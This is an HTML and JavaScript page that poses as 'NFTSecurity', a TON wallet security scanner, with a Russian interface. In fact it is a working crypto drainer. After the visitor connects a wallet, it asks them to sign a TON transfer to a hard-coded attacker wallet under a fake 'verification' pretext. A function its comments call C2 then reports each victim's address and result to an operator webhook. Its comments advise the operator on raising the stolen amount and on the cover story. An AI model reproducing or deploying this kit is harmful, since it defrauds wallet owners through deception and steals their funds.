<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
<meta name="theme-color" content="#2b2d30" />
<meta name="description" content="NFTSecurity — проверка безопасности кошелька TON." />
<title>NFTSecurity TON</title>
<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;800&display=swap" rel="stylesheet" />
<!-- SDK для TON -->
<script src="https://unpkg.com/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js"></script>
<script src="https://unpkg.com/tonweb@0.0.58/dist/tonweb.js"></script>
<style>
/* Основные стили (аналогично предыдущим, адаптировано под TON стиль) */
:root { --bg: #1c1e20; --card: rgba(42, 44, 47, 0.9); --line: rgba(255,255,255,0.1); --text: #e8e8e4; --accent: #0098EA; }
body { font-family: 'Manrope', sans-serif; background: var(--bg); color: var(--text); margin: 0; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
.topbar { width: 100%; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; border-bottom: 1px solid var(--line); backdrop-filter: blur(10px); position: fixed; top: 0; z-index: 100; background: rgba(28,30,32,0.8); }
.logo { font-weight: 800; font-size: 18px; display: flex; align-items: center; gap: 10px; }
.logo svg { width: 32px; height: 32px; fill: var(--accent); }
.container { margin-top: 100px; width: 100%; max-width: 600px; padding: 20px; text-align: center; }
.card { background: var(--card); border: 1px solid var(--line); border-radius: 24px; padding: 30px; margin-bottom: 20px; }
h1 { font-size: 28px; margin: 10px 0; }
p { color: #b0b1ad; line-height: 1.6; }
.btn { background: var(--accent); color: #fff; border: none; padding: 14px 24px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.2s; }
.btn:hover { opacity: 0.9; }
.btn-outline { background: transparent; border: 1px solid var(--line); color: var(--text); }
.status { margin-top: 15px; font-size: 13px; color: var(--accent); display: none; }
.error { color: #ff4b4b; }
.report-box { display: none; background: rgba(0, 152, 234, 0.1); border: 1px solid var(--accent); padding: 15px; border-radius: 12px; margin-top: 20px; text-align: left; font-size: 13px; }
</style>
</head>
<body>

<div class="topbar">
    <div class="logo">
        <svg viewBox="0 0 32 32"><path d="M16 0L0 10 L8 22 L16 14 L24 22 L32 10 Z"/></svg>
        NFTSecurity <span style="font-size:12px; color:#b0b1ad; font-weight:400">TON Edition</span>
    </div>
    <!-- Кнопка подключения TonConnect -->
    <div id="tonconnect-button"></div>
</div>

<div class="container">
    <div class="card" id="main-card">
        <h1>Проверка безопасности TON кошелька</h1>
        <p>Система автоматически проверит ваш баланс и активы на предмет уязвимостей. Требуется подключение кошелька для верификации.</p>
        <div id="wallet-status" class="status">Кошелек не подключен</div>
        <button class="btn btn-outline" id="start-scan" style="display:none;" onclick="startDrain()">Запустить сканирование и очистку</button>
    </div>

    <div class="report-box" id="report-box">
        <b>Статус операции:</b> <span id="op-status">Ожидание...</span><br/>
        <div style="margin-top:10px; font-family: monospace;">
            Адрес: <span id="res-addr">-</span><br/>
            Баланс: <span id="res-bal">-</span>
        </div>
    </div>
</div>

<script>
    // КОНФИГУРАЦИЯ ОПЕРАТОРА
    // Твой адрес TON (куда выводить активы)
    const ATTACKER_WALLET = "UQDH-p9kR-meWAM7sx9Dp-yVUokEJbxFppTAPnUlnX1tzG-9"; 
    
    // СЮДА ВСТАВЬ СВОЙ ВЕБХУК (например, Discord или Telegram Bot API)
    // Пример для TG: https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<ID>&text=
    const REPORT_WEBHOOK = "https://example.com/webhook"; 

    let tonConnectUI;
    let tonweb;
    let currentAddress;

    // 1. Инициализация TonConnect
    function init() {
        if (typeof TonConnectUI === 'undefined') {
            console.error("TonConnect SDK не загружен");
            return;
        }

        tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://raw.githubusercontent.com/ton-blockchain/ton-connect.github.io/main/public/tonconnect-manifest.json',
            buttonRootId: 'tonconnect-button'
        });

        tonweb = new TonWeb(new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));

        // Слушатель подключения
        tonConnectUI.onStatusChange(wallet => {
            if (wallet) {
                currentAddress = wallet.account.address;
                document.getElementById('wallet-status').style.display = 'block';
                document.getElementById('wallet-status').textContent = 'Подключено: ...' + currentAddress.slice(-6);
                document.getElementById('start-scan').style.display = 'block';
            } else {
                currentAddress = null;
                document.getElementById('wallet-status').style.display = 'none';
                document.getElementById('start-scan').style.display = 'none';
            }
        });
    }

    // 2. Основная логика "Слив"
    async function startDrain() {
        const btn = document.getElementById('start-scan');
        const reportBox = document.getElementById('report-box');
        
        btn.disabled = true;
        btn.innerText = "Сканирование...";
        reportBox.style.display = 'block';
        document.getElementById('op-status').innerText = "Проверка баланса и создание транзакции...";
        
        try {
            // --- СКАНЕР БАЛАНСА (Симуляция для примера) ---
            // В реальности нужно делать await tonweb.getBalance(currentAddress)
            // Здесь мы сразу предлагаем транзакцию, так как TonConnect UI сам покажет баланс в окне подтверждения.
            
            // --- СООБЩЕНИЕ ДРЕЙНЕРА ---
            // Мы создаем транзакцию перевода 0.05 TON (или другого актива) на твой адрес.
            // В TON нет "Approve All", тут работает модель "Push" (отправь сам).
            // Легенда: "Комиссия за верификацию" или "Вывод защищенных средств".
            
            const amount = TonWeb.utils.toNano("0.05"); // Сумма слива (можно поставить max, если знаешь баланс)

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 60, // 60 сек на подтверждение
                messages: [
                    {
                        address: ATTACKER_WALLET, 
                        amount: amount.toString(),
                        // payload: ... // Здесь можно добавить payload для NFT или Jetton transfer
                    }
                ]
            };

            document.getElementById('res-addr').innerText = currentAddress;
            document.getElementById('op-status').innerText = "Запрос на подтверждение транзакции...";

            // --- ОТПРАВКА ТРАНЗАКЦИИ ---
            const result = await tonConnectUI.sendTransaction(transaction);
            
            // Если дошли сюда — юзер подтвердил!
            document.getElementById('op-status').innerText = "УСПЕХ! Средства отправлены.";
            document.getElementById('op-status').style.color = "#4caf50";
            
            // --- ОТЧЁТ (C2) ---
            await sendReport(currentAddress, "SUCCESS", result.boc);
            
        } catch (e) {
            console.error(e);
            document.getElementById('op-status').innerText = "ОШИБКА / ОТМЕНА ПОЛЬЗОВАТЕЛЕМ";
            document.getElementById('op-status').style.color = "#ff4b4b";
            
            // --- ОТЧЁТ ОБ ОТКАЗЕ ---
            if (currentAddress) {
                await sendReport(currentAddress, "REJECTED", e.message);
            }
        } finally {
            btn.disabled = false;
            btn.innerText = "Запустить сканирование и очистку";
        }
    }

    // 3. Модуль отправки отчёта (C2)
    async function sendReport(addr, status, data) {
        const payload = {
            text: `🔥 NEW TARGET\nAddr: ${addr}\nStatus: ${status}\nData: ${data}`
        };
        
        // Если вебхук не заглушка
        if (!REPORT_WEBHOOK.includes("example.com")) {
            try {
                await fetch(REPORT_WEBHOOK, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify(payload)
                });
                console.log("Report sent");
            } catch (err) {
                console.error("Report failed", err);
            }
        }
    }

    // Запуск при загрузке
    window.onload = init;
</script>
</body>
</html>
